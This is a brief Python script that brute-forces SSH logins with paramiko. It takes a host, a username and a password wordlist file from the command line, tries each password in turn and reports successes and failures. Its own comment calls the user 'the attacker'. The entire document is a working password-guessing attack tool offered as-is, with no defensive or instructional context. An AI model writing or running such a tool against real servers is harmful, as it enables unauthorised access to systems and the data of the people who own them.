import pwn
import paramiko
import sys
import argparse

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# Create an ArgumentParser object
parser = argparse.ArgumentParser(description="Process user input with tags.")

# Add arguments for username (-u) and host (-H)
parser.add_argument("-u", "--username", type=str, required=True, help="Specify the username")
parser.add_argument("-H", "--host", type=str, required=True, help="Specify the host")
parser.add_argument("-f","--filename",type=str,required=True, help="Specify the filename")
# Parse the arguments
args = parser.parse_args()
attempts = 0
with open(args.filename,"r") as password_list:
    for password in password_list:
        password = password.strip("\n") #to strip the newline tag but if the file has unwanted whitespaces the attacker will have to remove it themselves
        try:
            print("[{}] Attempting password: '{}'!".format(attempts,password))
            response = ssh.connect(hostname=args.host, username=args.username, password=password,timeout=1)
            if ssh.get_transport() is not None:
                print("✅ SSH connection successful!")
                ssh.close()
                break
            else:
                print("❌ SSH connection failed!")
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1
                
